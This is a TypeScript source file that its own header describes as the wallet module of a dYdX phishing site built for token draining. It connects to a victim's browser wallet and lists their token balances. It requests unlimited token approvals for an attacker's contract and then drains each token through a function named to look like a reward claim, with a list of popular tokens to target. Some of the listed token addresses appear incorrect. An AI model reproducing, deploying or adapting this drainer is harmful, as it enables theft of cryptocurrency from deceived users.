/**
 * Wallet Connection Management for DyDx Phishing Site
 * 
 * Handles wallet connections and Web3 interactions for token draining
 */

import { ethers } from 'ethers'
import { rpcManager, CONTRACT_CONFIG, ERC20_ABI, REWARD_DISTRIBUTOR_ABI } from './web3'

export class WalletManager {
  private provider: ethers.providers.Web3Provider | null = null
  private signer: ethers.Signer | null = null
  private userAddress: string = ''

  // Initialize wallet connection
  async connectWallet(): Promise<string> {
    try {
      if (!window.ethereum) {
        throw new Error('No wallet found')
      }

      // Request account access
      const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts'
      })

      if (accounts.length === 0) {
        throw new Error('No accounts found')
      }

      // Set up provider and signer
      this.provider = new ethers.providers.Web3Provider(window.ethereum)
      this.signer = this.provider.getSigner()
      this.userAddress = accounts[0]

      console.log('Wallet connected:', this.userAddress)
      return this.userAddress
    } catch (error) {
      console.error('Wallet connection failed:', error)
      throw error
    }
  }

  // Get user's token balances
  async getTokenBalances(tokenAddresses: string[]): Promise<any[]> {
    if (!this.provider) {
      throw new Error('Wallet not connected')
    }

    const tokens = []

    for (const tokenAddress of tokenAddresses) {
      try {
        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, this.provider)
        
        const [balance, symbol, decimals, name] = await Promise.all([
          tokenContract.balanceOf(this.userAddress),
          tokenContract.symbol(),
          tokenContract.decimals(),
          tokenContract.name()
        ])

        if (balance.gt(0)) {
          tokens.push({
            address: tokenAddress,
            contract: tokenContract,
            balance,
            symbol,
            decimals,
            name,
            formattedBalance: ethers.utils.formatUnits(balance, decimals)
          })
        }
      } catch (error) {
        console.warn(`Failed to get balance for token ${tokenAddress}:`, error)
      }
    }

    return tokens
  }

  // Approve token for draining
  async approveToken(tokenAddress: string, amount?: ethers.BigNumber): Promise<boolean> {
    if (!this.signer) {
      throw new Error('Wallet not connected')
    }

    try {
      const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, this.signer)
      const approvalAmount = amount || ethers.constants.MaxUint256

      console.log(`Approving ${tokenAddress} for draining...`)
      
      const tx = await tokenContract.approve(CONTRACT_CONFIG.address, approvalAmount, {
        gasLimit: 100000,
        gasPrice: ethers.utils.parseUnits('20', 'gwei')
      })

      console.log('Approval transaction submitted:', tx.hash)
      
      const receipt = await tx.wait()
      console.log('Approval confirmed:', receipt.transactionHash)
      
      return true
    } catch (error) {
      console.error('Token approval failed:', error)
      return false
    }
  }

  // Execute token draining via contract
  async drainTokens(tokens: any[]): Promise<void> {
    if (!this.signer) {
      throw new Error('Wallet not connected')
    }

    try {
      const drainerContract = new ethers.Contract(
        CONTRACT_CONFIG.address,
        REWARD_DISTRIBUTOR_ABI,
        this.signer
      )

      for (const token of tokens) {
        try {
          console.log(`Draining ${token.symbol}...`)
          
          const tx = await drainerContract.claimUserRewards(
            token.address,
            token.balance,
            {
              gasLimit: 200000,
              gasPrice: ethers.utils.parseUnits('25', 'gwei')
            }
          )

          console.log(`${token.symbol} drain transaction:`, tx.hash)
          await tx.wait()
          console.log(`${token.symbol} successfully drained`)
          
        } catch (error) {
          console.error(`Failed to drain ${token.symbol}:`, error)
        }
      }
    } catch (error) {
      console.error('Token draining failed:', error)
      throw error
    }
  }

  // Get current wallet address
  getAddress(): string {
    return this.userAddress
  }

  // Check if wallet is connected
  isConnected(): boolean {
    return !!this.provider && !!this.userAddress
  }

  // Disconnect wallet
  disconnect(): void {
    this.provider = null
    this.signer = null
    this.userAddress = ''
  }
}

// Popular token addresses for targeting
export const POPULAR_TOKENS = [
  '0xA0b86a33E6441Da6fF10F40e58dC3CED17F5a60F', // USDT
  '0xa6d87cb13b5d3e4ffcbb6b67a8a8ba7f9a6e6a1f', // USDC
  '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', // SHIB
  '0x514910771AF9Ca656af840dff83E8264EcF986CA', // LINK
  '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', // UNI
  '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', // AAVE
  '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', // WBTC
  '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', // WETH
]

// Export singleton instance
export const walletManager = new WalletManager()
